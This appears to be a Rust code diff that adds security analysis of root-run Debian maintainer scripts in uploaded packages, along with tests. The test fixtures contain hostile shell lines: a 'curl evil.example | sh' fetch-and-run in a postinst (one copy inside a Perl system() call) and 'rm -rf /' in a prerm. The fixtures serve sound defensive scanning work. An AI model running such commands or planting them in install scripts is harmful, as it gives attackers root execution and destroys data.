@@ -49,6 +49,10 @@ use crate::models::repository::{RepositoryFormat, RepositoryType};
 use crate::models::signing_key::SigningKey;
 use crate::services::artifact_service::ArtifactService;
 use crate::services::cache_classifier;
+use crate::services::conda_scripts::{make_inline_script, InstallScript, ScriptKind};
+use crate::services::package_analysis_service::{
+    record_install_scripts, Completeness, UnanalyzedScript,
+};
 use crate::services::package_service::PackageService;
 use crate::services::proxy_service::{ProxyService, DEFAULT_DISTS_INDEX_TTL_SECS};
 use crate::services::signing_service::{
@@ -3238,6 +3242,9 @@ async fn persist_debian_upload(
         .storage_for_repo(&repo.storage_location())
         .map_err(|e| e.into_response())?;
     let artifact_service = state.create_artifact_service(storage);
+    // `Bytes` is refcounted: this keeps the upload body readable for the
+    // maintainer-script pass below without copying it.
+    let analysis_body = body.clone();
     let artifact = artifact_service
         .upload_with_sync_options(
             repo.id,
@@ -3261,6 +3268,33 @@ async fn persist_debian_upload(
         )
         .await
         .map_err(|e| e.into_response())?;
+
+    // `preinst`/`postinst`/`prerm`/`postrm` run as root on `apt install`
+    // (#4033). Best-effort: the artifact row is already committed.
+    let (scripts, unanalyzed, completeness) = extract_deb_maintainer_scripts(&analysis_body);
+    debug_assert!(
+        scripts
+            .iter()
+            .chain(unanalyzed.iter().map(|u| &u.script))
+            .all(|s| s.kind.runs_as_root()),
+        "debian maintainer scripts are root-privileged hooks"
+    );
+    if let Err(e) = record_install_scripts(
+        &state.db,
+        artifact.id,
+        "debian",
+        scripts,
+        unanalyzed,
+        completeness,
+    )
+    .await
+    {
+        tracing::warn!(
+            artifact_id = %artifact.id,
+            error = %e,
+            "debian maintainer-script analysis could not be recorded"
+        );
+    }
 
     PackageService::new(state.db.clone())
         .try_create_or_update_from_artifact(
@@ -3413,6 +3447,191 @@ async fn upload_raw(
             .to_string(),
         ))
         .unwrap())
+}
+
+// ---------------------------------------------------------------------------
+// Maintainer-script analysis (#4033)
+// ---------------------------------------------------------------------------
+
+/// Map a `control.tar` member name to the maintainer-script hook it is.
+///
+/// dpkg recognises exactly these four names; `config`, `templates`,
+/// `triggers`, `md5sums` and the like are data, not code that dpkg runs.
+fn deb_maintainer_script_kind(name: &str) -> Option<ScriptKind> {
+    match name {
+        "preinst" => Some(ScriptKind::DebPreInst),
+        "postinst" => Some(ScriptKind::DebPostInst),
+        "prerm" => Some(ScriptKind::DebPreRm),
+        "postrm" => Some(ScriptKind::DebPostRm),
+        _ => None,
+    }
+}
+
+/// Pick the decompressor for a `control.tar*` member from its extension, the
+/// same dispatch [`DebianHandler::extract_control`] uses.
+fn control_tar_decoder<'a>(
+    member_name: &str,
+    data: &'a [u8],
+) -> std::result::Result<Box<dyn Read + 'a>, String> {
+    Ok(if member_name.ends_with(".gz") {
+        Box::new(GzDecoder::new(data))
+    } else if member_name.ends_with(".xz") {
+        Box::new(XzDecoder::new(data))
+    } else if member_name.ends_with(".bz2") {
+        Box::new(bzip2::read::BzDecoder::new(data))
+    } else if member_name.ends_with(".zst") || member_name.ends_with(".zstd") {
+        Box::new(
+            zstd::stream::read::Decoder::new(data)
+                .map_err(|e| format!("invalid zstd stream: {e}"))?,
+        )
+    } else {
+        Box::new(data)
+    })
+}
+
+/// The interpreter named by a script's `#!` line, if it has one.
+///
+/// dpkg runs a maintainer script by executing it, so the shebang is what
+/// decides the language: `#!/usr/bin/perl` is legal and common. Returns the
+/// remainder of the line (`/usr/bin/env python3`, `/bin/sh -e`) for
+/// [`super::rpm::is_shell_interpreter`] to classify.
+fn shebang_interpreter(body: &str) -> Option<&str> {
+    body.lines().next()?.strip_prefix("#!").map(str::trim)
+}
+
+/// Walk a decoded `control.tar` once and capture every maintainer script.
+///
+/// Bounded exactly like `bounded_archive`'s single-entry readers (#2556): the
+/// decoded stream carries the total-byte budget, the walk stops at the shared
+/// entry-count cap, and each member is read through the per-entry cap. Every
+/// way the walk can fall short is reported in the returned [`Completeness`]:
+/// a stream that yields no entry at all is `NotRead`; a walk that stopped
+/// early, a script over its cap, or a script that is not valid UTF-8 (still
+/// analysed after lossy decoding, since the hostile part of a script is
+/// rarely the part that is not UTF-8) is `Partial` with the reason spelled
+/// out.
+///
+/// A script under a non-shell interpreter (`#!/usr/bin/perl`) is returned in
+/// the second list, un-analysed, with a sentence saying why: it exists and
+/// runs as root, so its body is stored, but shell rules over Perl would be
+/// wrong in both directions. That alone does not make the package `Partial`
+/// — every byte was read, and declining to judge one script is a fact
+/// carried by that script's own row.
+type ExtractedScripts = (Vec<InstallScript>, Vec<UnanalyzedScript>, Completeness);
+
+fn collect_deb_maintainer_scripts<R: Read>(decoded: R) -> ExtractedScripts {
+    use crate::util::bounded_archive::{
+        budgeted, read_capped, MAX_INGEST_ARCHIVE_ENTRIES, MAX_INGEST_METADATA_ENTRY_BYTES,
+    };
+
+    let mut archive = tar::Archive::new(budgeted(decoded));
+    let entries = match archive.entries() {
+        Ok(entries) => entries,
+        Err(e) => {
+            return (
+                Vec::new(),
+                Vec::new(),
+                Completeness::NotRead {
+                    reason: format!("control.tar could not be opened: {e}"),
+                },
+            )
+        }
+    };
+
+    let mut scripts = Vec::new();
+    let mut unanalyzed = Vec::new();
+    let mut problems: Vec<String> = Vec::new();
+    let mut scripts_seen: i32 = 0;
+    let mut entries_seen: u64 = 0;
+    for entry in entries {
+        let mut entry = match entry {
+            Ok(entry) => entry,
+            Err(e) => {
+                if entries_seen == 0 {
+                    return (
+                        Vec::new(),
+                        Vec::new(),
+                        Completeness::NotRead {
+                            reason: format!("control.tar could not be read: {e}"),
+                        },
+                    );
+                }
+                problems.push(format!("control.tar walk stopped early: {e}"));
+                break;
+            }
+        };
+        entries_seen += 1;
+        if entries_seen > MAX_INGEST_ARCHIVE_ENTRIES {
+            problems.push("control.tar exceeds the entry-count cap".to_string());
+            break;
+        }
+        let path = match entry.path() {
+            Ok(path) => path.to_string_lossy().into_owned(),
+            Err(_) => continue,
+        };
+        let name = path.trim_start_matches("./");
+        let Some(kind) = deb_maintainer_script_kind(name) else {
+            continue;
+        };
+        scripts_seen += 1;
+        match read_capped(&mut entry, MAX_INGEST_METADATA_ENTRY_BYTES, name) {
+            Ok(bytes) => {
+                let body = String::from_utf8_lossy(&bytes);
+                if matches!(body, std::borrow::Cow::Owned(_)) {
+                    problems.push(format!(
+                        "{name} is not valid UTF-8; analysed after lossy decoding"
+                    ));
+                }
+                let script = make_inline_script(kind, &format!("control.tar#{name}"), &body);
+                match shebang_interpreter(&body) {
+                    Some(interp) if !super::rpm::is_shell_interpreter(interp) => {
+                        unanalyzed.push(UnanalyzedScript {
+                            original_size_bytes: bytes.len() as i64,
+                            script,
+                            reason: format!(
+                                "{name} runs under {interp}, which the shell rules do not cover"
+                            ),
+                        });
+                    }
+                    _ => scripts.push(script),
+                }
+            }
+            Err(e) => problems.push(format!("{name} was not read: {e}")),
+        }
+    }
+
+    let completeness = if problems.is_empty() {
+        Completeness::Complete
+    } else {
+        Completeness::Partial {
+            reason: problems.join("; "),
+            files_read: (scripts.len() + unanalyzed.len()) as i32,
+            files_total: scripts_seen,
+        }
+    };
+    (scripts, unanalyzed, completeness)
+}
+
+/// Extract the maintainer scripts from an uploaded `.deb`.
+///
+/// Never fails: a package that cannot be opened yields no scripts and a
+/// `NotRead` completeness naming the reason, so the analysis row says "could
+/// not look" rather than "nothing found". The decode runs under the shared
+/// ingest-extraction permit; a saturated server is likewise `NotRead`, not a
+/// clean result.
+fn extract_deb_maintainer_scripts(body: &[u8]) -> ExtractedScripts {
+    let not_read = |reason: String| (Vec::new(), Vec::new(), Completeness::NotRead { reason });
+    let (member_name, data) = match DebianHandler::control_tar_member(body) {
+        Ok(found) => found,
+        Err(e) => return not_read(format!("control.tar could not be located: {e}")),
+    };
+    match crate::util::bounded_archive::with_ingest_extraction(|| {
+        control_tar_decoder(member_name, data).map(collect_deb_maintainer_scripts)
+    }) {
+        Ok(Ok(result)) => result,
+        Ok(Err(e)) => not_read(format!("{member_name} could not be decoded: {e}")),
+        Err(e) => not_read(format!("extraction slot unavailable: {e}")),
+    }
 }
 
 #[cfg(test)]
@@ -6936,5 +7155,286 @@ mod dists_package_content_tests {
             upstream_hits, 1,
             "the second download must be served from the proxy cache, not refetched"
         );
+    }
+}
+
+/// Maintainer-script extraction (#4033). Fixtures are built in-test: an `ar`
+/// wrapper around a `control.tar*` built with `tar::Builder`, so no binary
+/// package is checked in.
+#[cfg(test)]
+mod maintainer_script_tests {
+    use super::*;
+    use crate::services::conda_scripts::{analyze_script, ScriptSeverity};
+
+    fn tar_with(entries: &[(&str, &[u8])]) -> Vec<u8> {
+        let mut builder = tar::Builder::new(Vec::new());
+        for (name, bytes) in entries {
+            let mut header = tar::Header::new_gnu();
+            header.set_size(bytes.len() as u64);
+            header.set_mode(0o755);
+            header.set_cksum();
+            builder
+                .append_data(&mut header, format!("./{name}"), *bytes)
+                .expect("append entry");
+        }
+        builder.finish().expect("finish tar");
+        builder.into_inner().expect("tar bytes")
+    }
+
+    fn ar_member(out: &mut Vec<u8>, name: &str, data: &[u8]) {
+        let mut header = Vec::with_capacity(60);
+        header.extend_from_slice(format!("{:<16}", name).as_bytes());
+        header.extend_from_slice(format!("{:<12}", 0).as_bytes()); // mtime
+        header.extend_from_slice(format!("{:<6}", 0).as_bytes()); // uid
+        header.extend_from_slice(format!("{:<6}", 0).as_bytes()); // gid
+        header.extend_from_slice(format!("{:<8}", "100644").as_bytes());
+        header.extend_from_slice(format!("{:<10}", data.len()).as_bytes());
+        header.extend_from_slice(b"`\n");
+        assert_eq!(header.len(), 60);
+        out.extend_from_slice(&header);
+        out.extend_from_slice(data);
+        if data.len() % 2 == 1 {
+            out.push(b'\n');
+        }
+    }
+
+    fn deb(control_member: &str, control_tar: &[u8]) -> Vec<u8> {
+        let mut out = b"!<arch>\n".to_vec();
+        ar_member(&mut out, "debian-binary", b"2.0\n");
+        ar_member(&mut out, control_member, control_tar);
+        ar_member(&mut out, "data.tar.gz", b"not inspected here");
+        out
+    }
+
+    fn gz(bytes: &[u8]) -> Vec<u8> {
+        let mut enc = flate2::write::GzEncoder::new(Vec::new(), Compression::default());
+        enc.write_all(bytes).unwrap();
+        enc.finish().unwrap()
+    }
+
+    const CONTROL: &[u8] = b"Package: p\nVersion: 1\nArchitecture: all\n";
+    const HOSTILE: &[u8] = b"#!/bin/sh\nset -e\ncurl -s https://evil.example/x.sh | sh\n";
+
+    #[test]
+    fn hostile_postinst_is_found_and_flagged() {
+        let tar = tar_with(&[("control", CONTROL), ("postinst", HOSTILE)]);
+        let (scripts, unanalyzed, completeness) =
+            extract_deb_maintainer_scripts(&deb("control.tar.gz", &gz(&tar)));
+
+        assert_eq!(completeness, Completeness::Complete);
+        assert!(unanalyzed.is_empty());
+        assert_eq!(scripts.len(), 1);
+        let script = &scripts[0];
+        assert_eq!(script.kind, ScriptKind::DebPostInst);
+        assert_eq!(script.path, "control.tar#postinst");
+        assert!(script.kind.runs_as_root());
+        assert_eq!(script.body, String::from_utf8_lossy(HOSTILE));
+
+        let findings = analyze_script(script);
+        assert!(
+            findings.iter().any(|f| f.severity >= ScriptSeverity::High),
+            "curl | sh in a root-run postinst must be a high-severity finding: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn package_without_maintainer_scripts_is_complete_and_empty() {
+        let tar = tar_with(&[("control", CONTROL), ("md5sums", b"abc  usr/bin/p\n")]);
+        let (scripts, unanalyzed, completeness) =
+            extract_deb_maintainer_scripts(&deb("control.tar.gz", &gz(&tar)));
+        assert!(scripts.is_empty());
+        assert!(unanalyzed.is_empty());
+        assert_eq!(completeness, Completeness::Complete);
+    }
+
+    #[test]
+    fn every_hook_name_is_recognised_and_runs_as_root() {
+        let tar = tar_with(&[
+            ("control", CONTROL),
+            ("preinst", b"#!/bin/sh\necho pre\n"),
+            ("postinst", b"#!/bin/sh\necho post\n"),
+            ("prerm", b"#!/bin/sh\necho prerm\n"),
+            ("postrm", b"#!/bin/sh\necho postrm\n"),
+            ("config", b"#!/bin/sh\necho debconf, not a hook\n"),
+            ("triggers", b"interest /usr/share/p\n"),
+        ]);
+        let (scripts, unanalyzed, completeness) =
+            extract_deb_maintainer_scripts(&deb("control.tar.gz", &gz(&tar)));
+
+        assert_eq!(completeness, Completeness::Complete);
+        assert!(unanalyzed.is_empty());
+        let kinds: Vec<ScriptKind> = scripts.iter().map(|s| s.kind).collect();
+        assert_eq!(
+            kinds,
+            vec![
+                ScriptKind::DebPreInst,
+                ScriptKind::DebPostInst,
+                ScriptKind::DebPreRm,
+                ScriptKind::DebPostRm,
+            ]
+        );
+        assert!(scripts.iter().all(|s| s.kind.runs_as_root()));
+        assert!(scripts.iter().all(|s| s.path.starts_with("control.tar#")));
+    }
+
+    #[test]
+    fn xz_and_zst_and_plain_control_members_are_read() {
+        let tar = tar_with(&[("control", CONTROL), ("prerm", b"#!/bin/sh\nrm -rf /\n")]);
+
+        let mut xz = xz2::write::XzEncoder::new(Vec::new(), 6);
+        xz.write_all(&tar).unwrap();
+        let xz = xz.finish().unwrap();
+        let zst = zstd::stream::encode_all(tar.as_slice(), 3).unwrap();
+
+        for (member, bytes) in [
+            ("control.tar.xz", xz),
+            ("control.tar.zst", zst),
+            ("control.tar", tar.clone()),
+        ] {
+            let (scripts, unanalyzed, completeness) =
+                extract_deb_maintainer_scripts(&deb(member, &bytes));
+            assert_eq!(completeness, Completeness::Complete, "{member}");
+            assert!(unanalyzed.is_empty(), "{member}");
+            assert_eq!(scripts.len(), 1, "{member}");
+            assert_eq!(scripts[0].kind, ScriptKind::DebPreRm, "{member}");
+        }
+    }
+
+    /// The defect this epic exists to remove: an unreadable package must never
+    /// render as clean. Three shapes of "could not open" all report `NotRead`.
+    #[test]
+    fn unreadable_packages_are_not_read_never_complete() {
+        let not_ar = b"this is not an ar archive at all".to_vec();
+
+        let mut no_control = b"!<arch>\n".to_vec();
+        ar_member(&mut no_control, "debian-binary", b"2.0\n");
+        ar_member(&mut no_control, "data.tar.gz", b"payload only");
+
+        let garbage_gz = deb("control.tar.gz", b"\x1f\x8b definitely not a gzip stream");
+
+        // `control.tar.gz` is the LAST member here so the cut lands on it.
+        let mut truncated = b"!<arch>\n".to_vec();
+        ar_member(&mut truncated, "debian-binary", b"2.0\n");
+        ar_member(
+            &mut truncated,
+            "control.tar.gz",
+            &gz(&tar_with(&[("control", CONTROL)])),
+        );
+        truncated.truncate(truncated.len() - 10);
+
+        for (label, body) in [
+            ("not an ar archive", not_ar),
+            ("ar without control.tar", no_control),
+            ("garbage gzip", garbage_gz),
+            ("truncated ar member", truncated),
+        ] {
+            let (scripts, unanalyzed, completeness) = extract_deb_maintainer_scripts(&body);
+            assert!(scripts.is_empty(), "{label}");
+            assert!(unanalyzed.is_empty(), "{label}");
+            assert!(
+                matches!(completeness, Completeness::NotRead { .. }),
+                "{label}: expected NotRead, got {completeness:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn non_utf8_script_is_still_analysed_but_reported_partial() {
+        let mut body =
+            b"#!/bin/sh\n# \xff\xfe binary junk\ncurl http://evil.example/p | sh\n".to_vec();
+        body.push(0xC3); // dangling lead byte
+        let tar = tar_with(&[("control", CONTROL), ("postinst", &body)]);
+        let (scripts, unanalyzed, completeness) =
+            extract_deb_maintainer_scripts(&deb("control.tar.gz", &gz(&tar)));
+
+        assert_eq!(scripts.len(), 1);
+        assert!(unanalyzed.is_empty());
+        assert!(
+            !analyze_script(&scripts[0]).is_empty(),
+            "the readable part must still be analysed"
+        );
+        match completeness {
+            Completeness::Partial {
+                reason,
+                files_read,
+                files_total,
+            } => {
+                assert!(reason.contains("postinst"), "{reason}");
+                assert!(reason.contains("UTF-8"), "{reason}");
+                assert_eq!((files_read, files_total), (1, 1));
+            }
+            other => panic!("expected Partial, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn control_tar_member_rejects_oversized_member_claims() {
+        let mut out = b"!<arch>\n".to_vec();
+        ar_member(&mut out, "debian-binary", b"2.0\n");
+        // Claims 999999 bytes but carries 5.
+        let mut header = format!("{:<16}", "control.tar.gz").into_bytes();
+        header.extend_from_slice(
+            format!("{:<12}{:<6}{:<6}{:<8}{:<10}", 0, 0, 0, "100644", 999_999).as_bytes(),
+        );
+        header.extend_from_slice(b"`\n");
+        out.extend_from_slice(&header);
+        out.extend_from_slice(b"short");
+        let err = DebianHandler::control_tar_member(&out).unwrap_err();
+        assert!(err.to_string().contains("truncated"), "{err}");
+    }
+
+    /// `#!/usr/bin/perl` is a legal maintainer script. Shell rules would be
+    /// wrong in both directions, so it is recorded (it runs as root) but
+    /// handed back un-analysed with a reason — never as clean, and never
+    /// dropped. The package stays `Complete`: every byte was read.
+    #[test]
+    fn non_shell_interpreter_is_recorded_but_not_scanned() {
+        let perl = b"#!/usr/bin/perl -w\nsystem(\"curl http://evil.example/p | sh\");\n";
+        let tar = tar_with(&[
+            ("control", CONTROL),
+            ("postinst", perl),
+            ("prerm", b"#!/bin/sh -e\necho bye\n"),
+        ]);
+        let (scripts, unanalyzed, completeness) =
+            extract_deb_maintainer_scripts(&deb("control.tar.gz", &gz(&tar)));
+
+        assert_eq!(completeness, Completeness::Complete);
+        assert_eq!(scripts.len(), 1, "the shell prerm is still scanned");
+        assert_eq!(scripts[0].kind, ScriptKind::DebPreRm);
+
+        assert_eq!(unanalyzed.len(), 1);
+        let UnanalyzedScript {
+            script,
+            original_size_bytes,
+            reason,
+        } = &unanalyzed[0];
+        assert_eq!(script.kind, ScriptKind::DebPostInst);
+        assert_eq!(script.path, "control.tar#postinst");
+        assert!(script.kind.runs_as_root());
+        assert!(script.body.contains("system("));
+        assert_eq!(*original_size_bytes, perl.len() as i64);
+        assert_eq!(
+            reason,
+            "postinst runs under /usr/bin/perl -w, which the shell rules do not cover"
+        );
+    }
+
+    #[test]
+    fn shebang_interpreter_parses_common_forms() {
+        assert_eq!(
+            shebang_interpreter("#!/bin/sh -e\necho"),
+            Some("/bin/sh -e")
+        );
+        assert_eq!(
+            shebang_interpreter("#! /usr/bin/env python3\n"),
+            Some("/usr/bin/env python3")
+        );
+        assert_eq!(shebang_interpreter("echo no shebang"), None);
+        assert!(super::super::rpm::is_shell_interpreter("/usr/bin/env bash"));
+        assert!(super::super::rpm::is_shell_interpreter("/bin/sh -e"));
+        assert!(!super::super::rpm::is_shell_interpreter(
+            "/usr/bin/env python3"
+        ));
+        assert!(!super::super::rpm::is_shell_interpreter("<lua>"));
     }
 }
